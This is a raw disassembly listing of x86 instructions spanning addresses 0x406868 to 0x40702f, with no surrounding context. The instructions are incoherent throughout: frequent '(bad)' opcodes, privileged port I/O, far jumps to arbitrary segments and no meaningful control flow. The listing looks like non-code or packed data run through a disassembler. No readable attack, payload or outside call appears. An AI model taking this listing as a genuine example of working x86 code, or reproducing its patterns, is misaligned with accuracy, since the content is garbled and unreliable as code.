  406868:	(bad)  
  406869:	in     al,0xa0
  40686b:	jbe    0x406871
  40686d:	in     eax,0x40
  40686f:	stos   DWORD PTR es:[edi],eax
  406870:	push   es
  406871:	mov    ch,0xe5
  406873:	aam    0xa8
  406875:	fmul   st,st(6)
  406877:	push   edi
  406878:	cdq    
  406879:	jecxz  0x406813
  40687b:	sub    al,0xe
  40687d:	mov    edx,0xfa4e6b4a
  406882:	fdivr  QWORD PTR [esi]
  406884:	xor    eax,0x40aa0da8
  406889:	or     eax,0x7407b35b
  40688e:	in     al,dx
  40688f:	jnp    0x4068b0
  406891:	adc    BYTE PTR [edx+0x2a0ced87],ah
  406897:	inc    edx
  406898:	cmc    
  406899:	cmp    al,0xc0
  40689b:	inc    eax
  40689c:	push   ebp
  40689d:	jo     0x4068a9
  40689f:	cs loopne 0x406867
  4068a2:	pop    esi
  4068a3:	popf   
  4068a4:	ret    
  4068a5:	imul   esp,DWORD PTR [ebp-0x2d],0x68a20093
  4068ac:	adc    al,al
  4068ae:	in     al,0x79
  4068b0:	pop    eax
  4068b1:	idiv   DWORD PTR ds:0x8c8cd0e0
  4068b7:	or     ebx,esi
  4068b9:	mov    edi,0x23501b75
  4068be:	pop    edi
  4068bf:	pop    ds
  4068c0:	pop    esi
  4068c1:	es pop ds
  4068c3:	stos   DWORD PTR es:[edi],eax
  4068c4:	mov    gs,WORD PTR [ebx-0x7]
  4068c7:	(bad)  [edx-0x6c]
  4068ca:	adc    bl,al
  4068cc:	and    BYTE PTR [ebp-0x2943f1df],cl
  4068d2:	mov    ebp,eax
  4068d4:	fnstsw WORD PTR gs:[ebx-0x10453276]
  4068db:	or     esp,DWORD PTR [ecx+0x0]
  4068de:	iret   
  4068df:	outs   dx,DWORD PTR ds:[esi]
  4068e0:	loop   0x40694c
  4068e2:	add    DWORD PTR [ebp+0x3d],eax
  4068e5:	(bad)  
  4068e6:	pop    edx
  4068e7:	scas   al,BYTE PTR es:[edi]
  4068e8:	ud0    esp,ebx
  4068eb:	ficom  WORD PTR [ecx+0x4a]
  4068ee:	lahf   
  4068ef:	mov    edi,0x70558d0e
  4068f4:	pop    edx
  4068f5:	mov    ebp,0xe8e57f81
  4068fa:	lahf   
  4068fb:	sbb    ecx,DWORD PTR [edi-0x40]
  4068fe:	repnz stc 
  406900:	sbb    edx,DWORD PTR [ebp-0x7b]
  406903:	dec    esi
  406904:	call   0x4f83:0x43580d07
  40690b:	xor    cl,ah
  40690d:	sub    eax,0x997a1ff0
  406912:	repz mov esp,0xef61107d
  406918:	je     0x406901
  40691a:	sub    BYTE PTR [ebx+0x4d],al
  40691d:	cmp    ah,ch
  40691f:	outs   dx,DWORD PTR ds:[esi]
  406920:	mov    dh,0xfe
  406922:	ins    BYTE PTR es:[edi],dx
  406923:	add    BYTE PTR ds:0xb87bd64a,0x6a
  40692a:	mov    edx,0x5bc7a901
  40692f:	xor    al,0xcf
  406931:	sbb    BYTE PTR [ebp+0xa],dh
  406934:	loope  0x406913
  406936:	jb     0x4068fd
  406938:	aam    0x46
  40693a:	cmc    
  40693b:	scas   al,BYTE PTR es:[edi]
  40693c:	mov    ebx,DWORD PTR [esi+esi*1+0x51a836c2]
  406943:	inc    esi
  406944:	pop    eax
  406945:	(bad)  
  406946:	mov    dl,0xee
  406948:	shr    DWORD PTR [ebx+0x5d],0xfd
  40694c:	aas    
  40694d:	fbstp  TBYTE PTR [edx+0x1e]
  406950:	pop    eax
  406951:	cmp    DWORD PTR [esi+0x79ff5778],esp
  406957:	xor    eax,0xc34c6c59
  40695c:	cmp    al,0x32
  40695e:	inc    eax
  40695f:	xchg   BYTE PTR [ebx+0x48455c3b],bl
  406965:	daa    
  406966:	cmpxchg BYTE PTR [edi+esi*4],cl
  40696a:	or     DWORD PTR [edx+0x6d],ebx
  40696d:	cmp    BYTE PTR [ebp+0x67],cl
  406970:	stos   DWORD PTR es:[edi],eax
  406971:	sub    bh,BYTE PTR [edi+0x200c4df5]
  406977:	adc    dh,BYTE PTR [edx-0xd9b47c1]
  40697d:	cdq    
  40697e:	addr16 jne 0x406994
  406981:	jo     0x40693b
  406983:	push   es
  406984:	push   ds
  406985:	jle    0x40699b
  406987:	push   cs
  406988:	mov    eax,0x54578a9b
  40698d:	in     eax,dx
  40698e:	sbb    edi,DWORD PTR [ecx+esi*4-0x4b]
  406992:	xlat   BYTE PTR ds:[ebx]
  406993:	mov    DWORD PTR [edx],0xe4d52af9
  406999:	jl     0x40694e
  40699b:	mov    al,ds:0x9b041bd1
  4069a0:	lods   eax,DWORD PTR ds:[esi]
  4069a1:	push   edx
  4069a2:	adc    al,0x71
  4069a4:	sbb    DWORD PTR [ecx+0x57],esp
  4069a7:	push   edx
  4069a8:	and    DWORD PTR [ecx+ecx*1],ebx
  4069ab:	adc    al,0xda
  4069ad:	js     0x406933
  4069af:	test   BYTE PTR [esi-0x6ab142e2],bh
  4069b5:	pushf  
  4069b6:	sub    BYTE PTR [ecx],ah
  4069b8:	sbb    eax,0xaf846861
  4069bd:	jno    0x4069fc
  4069bf:	pop    ebx
  4069c0:	test   ah,al
  4069c2:	push   ecx
  4069c3:	in     al,dx
  4069c4:	pop    esi
  4069c5:	(bad)  
  4069c6:	mov    ecx,0xe730d554
  4069cb:	or     eax,esp
  4069cd:	mov    ebx,0x57a05536
  4069d2:	div    dl
  4069d4:	push   esp
  4069d5:	scas   eax,DWORD PTR es:[edi]
  4069d6:	test   DWORD PTR [ebx],ebx
  4069d8:	(bad)  
  4069d9:	and    eax,0xb7a7060c
  4069de:	sbb    DWORD PTR [ebx+0x66],ebp
  4069e1:	(bad)  
  4069e2:	cmc    
  4069e3:	cmc    
  4069e4:	ficomp DWORD PTR [ecx+0x53]
  4069e7:	stos   DWORD PTR es:[edi],eax
  4069e8:	enter  0x26aa,0x11
  4069ec:	ficom  DWORD PTR [esi]
  4069ee:	push   esi
  4069ef:	sti    
  4069f0:	pop    ebx
  4069f1:	dec    ebp
  4069f2:	nop
  4069f3:	xchg   ecx,eax
  4069f4:	int    0x1e
  4069f6:	push   ebp
  4069f7:	loope  0x40698b
  4069f9:	or     eax,0xbbf39c36
  4069fe:	and    esp,DWORD PTR [ebx+0x233b8cf5]
  406a04:	sahf   
  406a05:	ret    
  406a06:	es pusha 
  406a08:	fs or  bl,dh
  406a0b:	cli    
  406a0c:	sbb    cl,BYTE PTR [eax-0x5b]
  406a0f:	cmp    al,0x9f
  406a11:	lea    eax,[edx]
  406a13:	adc    ebx,edx
  406a15:	add    BYTE PTR [esi],dh
  406a17:	mov    ds:0xc7641940,eax
  406a1c:	mov    cl,0xd9
  406a1e:	push   esp
  406a1f:	cmp    DWORD PTR [edx+0x5423b383],0x9fc309df
  406a29:	iret   
  406a2a:	(bad)  
  406a2b:	test   edx,edx
  406a2d:	test   al,0x59
  406a2f:	sub    eax,0x16a25e9c
  406a34:	loop   0x406a34
  406a36:	xor    DWORD PTR [edx-0x23c6ec2a],ecx
  406a3c:	sbb    BYTE PTR [edi],0xf4
  406a3f:	(bad)  
  406a40:	sahf   
  406a41:	xchg   ebp,eax
  406a42:	ret    0xe1ca
  406a45:	(bad)  
  406a46:	sar    DWORD PTR [edx],cl
  406a48:	(bad)  
  406a49:	xlat   BYTE PTR ds:[ebx]
  406a4a:	mov    ch,0xbd
  406a4c:	call   0x6e76bf3f
  406a51:	mov    DWORD PTR [esi-0x36b0b34f],esp
  406a57:	mov    bl,0x2
  406a59:	out    dx,al
  406a5a:	push   0x7f
  406a5c:	mov    ds:0x9371f468,eax
  406a61:	add    DWORD PTR [ebx+0x75],0x595f8a5a
  406a68:	enter  0x96d0,0x23
  406a6c:	imul   eax,ecx,0x1e
  406a6f:	jnp    0x406ab6
  406a71:	repz xlat BYTE PTR ds:[ebx]
  406a73:	mov    ah,bl
  406a75:	and    ecx,DWORD PTR ds:0x979a55b8
  406a7b:	push   cs
  406a7c:	shr    BYTE PTR [edi-0x54],cl
  406a7f:	imul   esi,DWORD PTR ds:0x320f40ac,0xfc124792
  406a89:	sbb    DWORD PTR [ecx],eax
  406a8b:	(bad)  
  406a8d:	mov    ch,0x15
  406a8f:	pop    esi
  406a90:	jge    0x406ae2
  406a92:	inc    ecx
  406a93:	jmp    0x5b0:0xa136d776
  406a9a:	sub    cl,BYTE PTR [ebx]
  406a9c:	mov    ecx,0xc53d7d42
  406aa1:	jb     0x406ab9
  406aa3:	pop    esi
  406aa4:	ret    0xa8bf
  406aa7:	mov    dl,0xb1
  406aa9:	cmp    esi,DWORD PTR [esi-0x12]
  406aac:	test   BYTE PTR [si-0x6b],bh
  406ab0:	push   ecx
  406ab1:	mov    ebp,?
  406ab3:	mov    edi,0xfdfeee3f
  406ab8:	xor    BYTE PTR [ecx],0xbc
  406abb:	xlat   BYTE PTR ds:[ebx]
  406abc:	mov    ebx,0x4d81ef3b
  406ac1:	and    edx,DWORD PTR [edx]
  406ac3:	cmc    
  406ac4:	imul   ebx,DWORD PTR [esi],0x523b705d
  406aca:	pop    ebp
  406acb:	cmp    BYTE PTR [ecx-0x14],dl
  406ace:	arpl   WORD PTR ds:0x46194018,sp
  406ad4:	push   eax
  406ad5:	ins    DWORD PTR es:[edi],dx
  406ad6:	mov    ds:0xe43eb7a6,eax
  406adb:	xchg   BYTE PTR [edx-0x4b],bh
  406ade:	dec    esi
  406adf:	sbb    BYTE PTR [ecx-0x36],bh
  406ae2:	xchg   edx,eax
  406ae3:	or     dl,bh
  406ae5:	xor    DWORD PTR [edx+0x79],esp
  406ae8:	cmp    al,BYTE PTR [ecx]
  406aea:	dec    ebx
  406aeb:	dec    ebp
  406aec:	repnz aad 0xd2
  406aef:	and    BYTE PTR [edx-0x43059618],0x7f
  406af6:	jne    0x406b26
  406af8:	jle    0x406b70
  406afa:	sub    edx,DWORD PTR [eax-0x3afa0b64]
  406b00:	jle    0x406b42
  406b02:	pop    es
  406b03:	jb     0x406a90
  406b05:	test   bl,dl
  406b07:	jae    0x406af0
  406b09:	(bad)  
  406b0a:	mov    esi,0xaf0ee481
  406b0f:	mov    dh,0xa8
  406b11:	aam    0xac
  406b13:	adc    al,0xa3
  406b15:	adc    DWORD PTR [edx-0x38c45df9],ebp
  406b1b:	enter  0x65c0,0xee
  406b1f:	out    dx,al
  406b20:	cmp    ebx,ebx
  406b22:	jbe    0x406b47
  406b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b25:	int    0x7f
  406b27:	and    edx,edx
  406b29:	mov    ss,edx
  406b2b:	push   ds
  406b2c:	das    
  406b2d:	sub    al,0x2f
  406b2f:	lds    ecx,FWORD PTR [eax-0x7fbcfd5c]
  406b35:	fstp   QWORD PTR [ecx]
  406b37:	or     ch,BYTE PTR [ebp-0x6cca823]
  406b3d:	mov    edx,0xc68d4ea3
  406b42:	mov    dl,0x1e
  406b44:	outs   dx,BYTE PTR ds:[esi]
  406b45:	les    edx,FWORD PTR [esi]
  406b47:	cmp    BYTE PTR [ecx],ch
  406b49:	sbb    ebp,esi
  406b4b:	paddq  mm1,QWORD PTR [ecx+eiz*8+0x56]
  406b50:	rol    edi,0x74
  406b53:	out    0xd3,eax
  406b55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b56:	xor    ecx,DWORD PTR [ebx-0x57]
  406b59:	sub    cl,BYTE PTR [eax]
  406b5b:	xlat   BYTE PTR ds:[ebx]
  406b5c:	mov    ds:0xaf32d22f,eax
  406b61:	jmp    0x6671:0xda7b4b74
  406b68:	scas   al,BYTE PTR es:[edi]
  406b69:	cmp    al,0xec
  406b6b:	cli    
  406b6c:	jnp    0x406bb3
  406b6e:	jp     0x406b60
  406b70:	icebp  
  406b71:	arpl   sp,ax
  406b73:	jbe    0x406b90
  406b75:	nop
  406b76:	push   ebp
  406b77:	loope  0x406b4f
  406b79:	ins    BYTE PTR es:[edi],dx
  406b7a:	pop    ebp
  406b7b:	gs xor cl,bh
  406b7e:	mov    edi,0x21f1c540
  406b83:	stc    
  406b84:	(bad)  
  406b85:	je     0x406b07
  406b87:	xor    dl,dh
  406b89:	push   edx
  406b8a:	aad    0x15
  406b8c:	test   DWORD PTR [eax-0x490d06a],ebp
  406b92:	inc    esi
  406b93:	or     al,0xfb
  406b95:	lea    ebx,[ebx+eax*1]
  406b98:	push   edi
  406b99:	jnp    0x406bbc
  406b9b:	ror    BYTE PTR [edx-0xcac691c],1
  406ba1:	xor    al,0xeb
  406ba3:	and    al,0x4e
  406ba5:	xor    eax,0x158584a0
  406baa:	push   edx
  406bab:	data16 ss cld 
  406bae:	(bad)  
  406baf:	out    dx,eax
  406bb0:	cmc    
  406bb1:	xchg   DWORD PTR [edi],esi
  406bb3:	in     eax,0x9e
  406bb5:	jmp    0xe109:0xe0d837d7
  406bbc:	out    0x63,al
  406bbe:	cld    
  406bbf:	push   ebp
  406bc0:	int3   
  406bc1:	hlt    
  406bc2:	xor    edx,DWORD PTR [esi+0x1cd34799]
  406bc8:	(bad)  
  406bc9:	aaa    
  406bca:	ins    DWORD PTR es:[edi],dx
  406bcb:	ror    DWORD PTR ds:0xdf80f612,cl
  406bd1:	pop    esi
  406bd2:	and    bh,BYTE PTR [esi]
  406bd4:	pop    ss
  406bd5:	sub    BYTE PTR [eax],bl
  406bd7:	(bad)  
  406bd8:	xor    bl,dh
  406bda:	arpl   WORD PTR [edi],di
  406bdc:	(bad)  
  406bdd:	xlat   BYTE PTR ds:[ebx]
  406bde:	cmp    al,0x73
  406be0:	sbb    eax,0xba64a566
  406be5:	xor    esi,DWORD PTR [ebp+0x46e70534]
  406beb:	xchg   esp,eax
  406bec:	fcomp  DWORD PTR [edx+0x25af4344]
  406bf2:	and    al,0xd8
  406bf4:	imul   esp,DWORD PTR [esi-0xff902f],0x5c
  406bfb:	push   esp
  406bfc:	mov    al,0x68
  406bfe:	retf   
  406bff:	mov    dl,0x36
  406c01:	jmp    0xbf98:0xa620bc99
  406c08:	repz aas 
  406c0a:	cs lock movs DWORD PTR es:[edi],DWORD PTR es:[esi]
  406c0e:	mov    ds:0xe23c9609,eax
  406c13:	sbb    eax,0x3c1b844a
  406c18:	adc    eax,0x5cf75258
  406c1d:	dec    ebp
  406c1e:	adc    al,0x35
  406c20:	or     ebp,edi
  406c22:	jno    0x406bfd
  406c24:	arpl   WORD PTR [ebx+0x4a3cd71],ax
  406c2a:	mov    ds:0x5b9e9ef7,eax
  406c2f:	pusha  
  406c30:	and    cl,dl
  406c32:	mov    dl,0xfa
  406c34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c35:	jp     0x406bf0
  406c37:	dec    esp
  406c38:	outs   dx,BYTE PTR ds:[esi]
  406c39:	mov    ds,WORD PTR [eax]
  406c3b:	pop    es
  406c3c:	xchg   ebx,eax
  406c3d:	fdiv   QWORD PTR [esi]
  406c3f:	repnz pop edx
  406c41:	push   eax
  406c42:	lea    ecx,[edi-0xc8470bb]
  406c48:	out    0xe3,eax
  406c4a:	enter  0xedbc,0xf3
  406c4e:	mov    DWORD PTR [ebp-0xb],edx
  406c51:	das    
  406c52:	aaa    
  406c53:	sbb    al,0xe2
  406c55:	xchg   edi,eax
  406c56:	add    eax,0x3b107db1
  406c5b:	or     DWORD PTR [eax],ebp
  406c5d:	dec    esi
  406c5e:	mov    WORD PTR [edx],fs
  406c60:	in     eax,dx
  406c61:	in     al,dx
  406c62:	push   edx
  406c63:	leave  
  406c64:	std    
  406c65:	or     DWORD PTR [eax],0x18
  406c68:	clc    
  406c69:	dec    ecx
  406c6a:	les    eax,FWORD PTR [edi+0x474e2766]
  406c70:	sub    eax,0x71eef8e5
  406c75:	add    DWORD PTR [esi],esp
  406c77:	inc    ecx
  406c78:	in     al,0x87
  406c7a:	les    ebp,FWORD PTR [esi]
  406c7c:	dec    edi
  406c7d:	adc    dh,dl
  406c7f:	aaa    
  406c80:	pop    ebx
  406c81:	push   esp
  406c82:	(bad)  
  406c84:	xchg   esp,eax
  406c85:	dec    esp
  406c86:	inc    ecx
  406c87:	add    al,0xb2
  406c89:	add    BYTE PTR [edx+0xc4a128d],dh
  406c8f:	sub    esp,DWORD PTR [ecx-0x53]
  406c92:	sub    ch,BYTE PTR [ebp-0x4d]
  406c95:	mov    ebp,0xdb320a5d
  406c9a:	or     al,0x93
  406c9c:	mov    esi,0xdc55947a
  406ca1:	jmp    0x406d0a
  406ca3:	pop    ebp
  406ca4:	inc    ebp
  406ca5:	icebp  
  406ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ca7:	pop    es
  406ca8:	shl    bh,cl
  406caa:	bound  esp,QWORD PTR ds:0xa9ee7b7b
  406cb0:	or     BYTE PTR [eax-0x75],dh
  406cb3:	pop    ecx
  406cb4:	sub    DWORD PTR [ecx+0x40dc749a],ebp
  406cba:	in     eax,0x9e
  406cbc:	scas   al,BYTE PTR es:[edi]
  406cbd:	pop    ecx
  406cbe:	mov    dl,BYTE PTR [ebp+0x5be1fa9f]
  406cc4:	inc    edx
  406cc5:	sub    al,0xa7
  406cc7:	push   cs
  406cc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cc9:	aad    0x9f
  406ccb:	add    eax,0x8d79aec9
  406cd0:	int    0xbd
  406cd2:	(bad)  
  406cd3:	push   edi
  406cd4:	mov    al,ds:0x117aad88
  406cd9:	repnz inc eax
  406cdb:	es gs mov bl,0x7d
  406cdf:	fisubr WORD PTR [eax-0x52]
  406ce3:	add    al,0xc5
  406ce5:	mov    ds:0xa9d69662,eax
  406cea:	push   ebx
  406ceb:	or     eax,DWORD PTR [eax-0x12190ad1]
  406cf1:	adc    BYTE PTR [ebx+0x5a],0x96
  406cf5:	inc    ecx
  406cf6:	mov    ah,0x5e
  406cf8:	and    BYTE PTR [eax+eax*8],0x88
  406cfc:	adc    DWORD PTR [eax+eax*4],eax
  406cff:	mov    ecx,0x8bc46a80
  406d04:	push   DWORD PTR [ebx+0x79]
  406d07:	sub    cl,dl
  406d09:	push   ss
  406d0a:	aad    0xdc
  406d0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d0d:	cdq    
  406d0e:	xor    dh,bl
  406d10:	and    dl,BYTE PTR [esi+0x11]
  406d13:	ss out dx,al
  406d15:	mov    ah,0x7e
  406d17:	dec    eax
  406d18:	loop   0x406d65
  406d1a:	jnp    0x406cec
  406d1c:	jmp    0x406d06
  406d1e:	mov    WORD PTR [ebx-0x5f],ss
  406d21:	leave  
  406d22:	or     DWORD PTR [ebp+ebx*8+0x21],0xffffffa2
  406d27:	(bad)  
  406d28:	test   eax,0x913136ba
  406d2d:	push   0xffffff9d
  406d2f:	xchg   edx,eax
  406d30:	mov    BYTE PTR [eax],al
  406d32:	in     eax,0x94
  406d34:	jnp    0x406d25
  406d36:	cmp    edi,DWORD PTR [eax]
  406d38:	mov    DWORD PTR [edx-0xc65d696],edi
  406d3e:	je     0x406d87
  406d40:	out    0x83,al
  406d42:	sbb    ch,BYTE PTR [eax]
  406d44:	sub    al,0x28
  406d46:	fadd   DWORD PTR [eax+0x64]
  406d49:	or     ebp,DWORD PTR [ecx]
  406d4b:	pop    ss
  406d4c:	xchg   esi,eax
  406d4d:	sub    BYTE PTR [eax-0x1d3ffbc8],ch
  406d53:	sahf   
  406d54:	sti    
  406d55:	add    al,0x46
  406d57:	rol    DWORD PTR [ecx+0x1f9c5270],0x7d
  406d5e:	(bad)  
  406d5f:	sbb    edi,DWORD PTR [ebx+0x3fb43866]
  406d65:	imul   esp,DWORD PTR [edx+0x39],0x71
  406d69:	pop    ecx
  406d6a:	call   0xa8c0d121
  406d6f:	sub    BYTE PTR [eax+0x3da11c60],bh
  406d75:	mov    esp,DWORD PTR [ebx]
  406d77:	imul   BYTE PTR [esp+esi*2+0x67c517c4]
  406d7e:	sbb    al,0xe5
  406d80:	cmp    bh,al
  406d82:	xor    ebx,DWORD PTR [eax]
  406d84:	les    ecx,FWORD PTR [ebp+0x31888b2c]
  406d8a:	bound  ebp,QWORD PTR [edi-0x5593c065]
  406d90:	rcl    BYTE PTR [esi+0x1d],cl
  406d93:	xchg   bh,bh
  406d95:	lock xchg esp,eax
  406d97:	cmp    DWORD PTR [edi],edi
  406d99:	cdq    
  406d9a:	mov    ds:0xe6fe2bf2,eax
  406d9f:	sahf   
  406da0:	inc    ebx
  406da1:	in     al,dx
  406da2:	adc    esp,DWORD PTR [edi+0xac15a8d]
  406da8:	push   ss
  406da9:	sti    
  406daa:	inc    eax
  406dab:	mov    ah,0xc5
  406dad:	push   cs
  406dae:	ins    DWORD PTR es:[edi],dx
  406daf:	ss aam 0x42
  406db2:	jmp    0x2d5e:0x3e4ed4d4
  406db9:	outs   dx,DWORD PTR ds:[esi]
  406dba:	mov    ebp,0x790f50d9
  406dbf:	imul   edx,DWORD PTR ds:0x7ceabce2,0x997bde80
  406dc9:	push   0xf8dc0cdc
  406dce:	push   edi
  406dcf:	les    edi,FWORD PTR cs:[ecx-0x3919f360]
  406dd6:	add    eax,0xce2c8ec2
  406ddb:	fmulp  st(4),st
  406ddd:	jecxz  0x406e09
  406ddf:	ret    0x3530
  406de2:	push   ds
  406de3:	loop   0x406d85
  406de5:	cdq    
  406de6:	sub    BYTE PTR [edx],bl
  406de8:	jb     0x406d6d
  406dea:	addr16 pop esp
  406dec:	jmp    0x406d91
  406dee:	addr16 out dx,eax
  406df0:	jae    0x406dae
  406df2:	mov    edx,DWORD PTR [ebx+0x76]
  406df5:	adc    BYTE PTR gs:[ebx+0x49],ch
  406df9:	mov    eax,ds:0x882562d9
  406dfe:	xchg   ebp,eax
  406dff:	xchg   edi,eax
  406e00:	repz push edx
  406e02:	or     al,0xef
  406e04:	or     eax,0x6ecb0861
  406e09:	inc    ecx
  406e0a:	in     al,dx
  406e0b:	ret    
  406e0c:	xchg   ebp,eax
  406e0d:	xlat   BYTE PTR ds:[ebx]
  406e0e:	and    ah,bl
  406e10:	dec    ecx
  406e11:	xchg   esp,eax
  406e12:	fnstsw WORD PTR [eax+0x1eea44ed]
  406e18:	pop    edi
  406e19:	mov    dl,0xdc
  406e1b:	cmp    ah,BYTE PTR [eax+0x53]
  406e1e:	pop    edi
  406e1f:	outs   dx,DWORD PTR ds:[esi]
  406e20:	and    al,0x89
  406e22:	aam    0x6d
  406e24:	push   es
  406e25:	jne    0x406e9d
  406e27:	lds    edi,FWORD PTR fs:[esi-0x3e]
  406e2b:	mov    edx,0x55422e4f
  406e30:	std    
  406e31:	jbe    0x406e2e
  406e33:	aas    
  406e34:	mov    ds,WORD PTR ds:0x272cbeda
  406e3a:	pop    edx
  406e3b:	sbb    ecx,DWORD PTR [esi+0x3]
  406e3e:	outs   dx,DWORD PTR ds:[esi]
  406e3f:	jg     0x406e2d
  406e41:	lods   eax,DWORD PTR ds:[esi]
  406e42:	popf   
  406e43:	clc    
  406e44:	jp     0x406e06
  406e46:	lods   al,BYTE PTR ds:[esi]
  406e47:	inc    esp
  406e48:	int    0xb
  406e4a:	mov    ds:0x78965536,eax
  406e4f:	mov    eax,ds:0x1e00f059
  406e54:	aad    0xe5
  406e56:	pop    es
  406e57:	or     DWORD PTR [ecx-0x4f876938],edx
  406e5d:	rcr    BYTE PTR [edi+0xd],0x75
  406e61:	cli    
  406e62:	mov    ch,0xd2
  406e64:	sub    DWORD PTR [ebx],0x33337c64
  406e6a:	cwde   
  406e6b:	add    eax,0x84d25a5a
  406e70:	mov    esi,0xf4be1642
  406e75:	xchg   edx,eax
  406e76:	ins    DWORD PTR es:[edi],dx
  406e77:	sahf   
  406e78:	jle    0x406e1b
  406e7a:	push   ds
  406e7b:	mov    ch,0x9c
  406e7d:	fisub  WORD PTR [esi+0x16]
  406e80:	cmp    al,0x9a
  406e82:	les    ebx,FWORD PTR [eax-0xbd21c3a]
  406e88:	mov    ebp,0x31bd2c2d
  406e8d:	scas   al,BYTE PTR es:[edi]
  406e8e:	xor    eax,0x8fa52e60
  406e93:	add    BYTE PTR [ebp-0x7a],0x5c
  406e97:	iret   
  406e98:	call   0xd376:0xbf64080
  406e9f:	(bad)  
  406ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ea1:	pop    edi
  406ea2:	jbe    0x406ef0
  406ea4:	or     eax,0x45437c49
  406ea9:	(bad)  
  406eab:	sahf   
  406eac:	mov    edi,0xc04545b3
  406eb1:	popa   
  406eb2:	into   
  406eb3:	mov    ah,0x34
  406eb5:	mov    edi,0xbddcebc3
  406eba:	movd   DWORD PTR [esi+0x5c3b7e98],mm7
  406ec1:	cmp    ch,ah
  406ec3:	sub    bh,BYTE PTR ss:[eax]
  406ec6:	enter  0xbe31,0x87
  406eca:	push   ecx
  406ecb:	add    eax,0xc3445404
  406ed0:	lea    edi,[eax+0x1b]
  406ed3:	mov    ds:0x6ab3e987,eax
  406ed8:	xchg   esp,eax
  406ed9:	mov    ch,0x7
  406edb:	add    BYTE PTR [edi-0x62],0x38
  406edf:	mov    dh,0x55
  406ee1:	cmp    ebx,0xffffffc0
  406ee4:	push   edi
  406ee5:	mov    ds:0xdcbf0ae5,al
  406eea:	sahf   
  406eeb:	and    edx,0x1a
  406eee:	ss mov esp,0xf3aef347
  406ef4:	enter  0x4c90,0x94
  406ef8:	lahf   
  406ef9:	push   ds
  406efa:	test   DWORD PTR [eax+0x56],esi
  406efd:	inc    edx
  406efe:	add    cl,BYTE PTR [esi+ecx*8+0x57]
  406f02:	fistp  WORD PTR [eax+eiz*4-0x37]
  406f06:	pop    esp
  406f07:	in     eax,0x59
  406f09:	mov    ecx,esi
  406f0b:	pusha  
  406f0c:	imul   ebx,DWORD PTR [ebx+eiz*2-0x42],0xa892726c
  406f14:	pop    ss
  406f15:	mov    WORD PTR [ecx+0x4b],cs
  406f18:	repnz fcmovnb st,st(2)
  406f1b:	sti    
  406f1c:	test   DWORD PTR [edi],ecx
  406f1e:	push   eax
  406f1f:	push   ss
  406f20:	mov    eax,0x28f4e577
  406f25:	inc    ecx
  406f26:	arpl   WORD PTR [edx-0x584238b4],sp
  406f2c:	ins    BYTE PTR es:[edi],dx
  406f2d:	xchg   esp,eax
  406f2e:	jge    0x406f99
  406f30:	or     ch,dl
  406f32:	add    eax,0xe7059c1d
  406f37:	mov    edx,0xb9ebaab6
  406f3c:	jns    0x406efc
  406f3e:	sti    
  406f3f:	ret    0xd8d8
  406f42:	test   al,0x2b
  406f44:	(bad)  
  406f45:	xrelease xchg DWORD PTR ds:0x1502a08c,esp
  406f4c:	(bad)  
  406f4e:	push   cs
  406f4f:	mov    eax,0x75c3c987
  406f54:	popf   
  406f55:	push   ebp
  406f56:	or     BYTE PTR [edi-0x71b8cb2b],bh
  406f5c:	dec    ebx
  406f5d:	mov    edx,0xa82cc289
  406f62:	lds    edi,FWORD PTR ds:0xc35f7761
  406f68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f69:	xchg   ecx,eax
  406f6a:	loope  0x406fe1
  406f6c:	int    0x25
  406f6e:	jns    0x406f66
  406f70:	or     DWORD PTR [edx],0xfd1c7239
  406f76:	inc    edi
  406f77:	inc    esp
  406f78:	jp     0x406fe0
  406f7a:	push   0xa67afed7
  406f7f:	and    ecx,DWORD PTR [ebp+eiz*8-0x6400fb4e]
  406f86:	cmp    ah,BYTE PTR [ecx]
  406f88:	adc    esi,esi
  406f8a:	sbb    ah,dl
  406f8c:	mov    eax,0xa6021d53
  406f91:	mov    esi,0x8044f808
  406f96:	es adc edx,edx
  406f99:	mov    dh,0x48
  406f9b:	xor    edi,DWORD PTR ds:0x962ab48d
  406fa1:	enter  0x9dd0,0x37
  406fa5:	retf   0xf47
  406fa8:	pop    edx
  406fa9:	push   cs
  406faa:	inc    edi
  406fab:	lods   eax,DWORD PTR ds:[esi]
  406fac:	xor    DWORD PTR [ebx+0x63],eax
  406faf:	cwde   
  406fb0:	and    ah,dl
  406fb2:	in     al,dx
  406fb3:	loop   0x406f3e
  406fb5:	lahf   
  406fb6:	push   ss
  406fb7:	and    DWORD PTR [esi+eax*2],esp
  406fba:	ficom  WORD PTR [eax+0x6c]
  406fbd:	in     eax,0x52
  406fbf:	add    dh,BYTE PTR [ecx+0x1c]
  406fc2:	adc    BYTE PTR [ebp+0x47822c45],dh
  406fc8:	pushf  
  406fc9:	cmp    cl,BYTE PTR [ebp-0x5e]
  406fcc:	lock and BYTE PTR [edx-0x2d],0x37
  406fd1:	and    eax,0x180de275
  406fd6:	push   edx
  406fd7:	add    BYTE PTR [esi+0x5e49d1c5],0x85
  406fde:	repz add al,0xc7
  406fe1:	dec    esp
  406fe2:	fs pop ecx
  406fe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fe5:	inc    ebp
  406fe6:	lea    esp,ds:0x6e15301a
  406fec:	xchg   ebx,eax
  406fed:	fwait
  406fee:	addr16 inc ebx
  406ff0:	pop    es
  406ff1:	fidiv  DWORD PTR [edx]
  406ff3:	adc    DWORD PTR [edx+0x5c3f5e5c],esp
  406ff9:	mov    esp,0xd663ecbd
  406ffe:	xor    BYTE PTR [edi+0x7f38f6cd],bh
  407004:	mov    dl,0x2d
  407006:	(bad)  
  407007:	jnp    0x407016
  407009:	(bad)  
  40700b:	xchg   esi,eax
  40700c:	scas   eax,DWORD PTR es:[edi]
  40700d:	push   esp
  40700e:	cli    
  40700f:	(bad)  
  407010:	iret   
  407011:	jno    0x406fa3
  407013:	imul   ebp,DWORD PTR [edi+0x25],0x0
  407017:	and    eax,0xd2f4a524
  40701c:	ss add al,0x3c
  40701f:	inc    esi
  407020:	ja     0x407092
  407022:	mov    cl,BYTE PTR [ebp+0x2b3038e3]
  407028:	test   eax,0x2e044909
  40702d:	cdq    
  40702e:	cdq    
  40702f:	mov    cl,0xa0
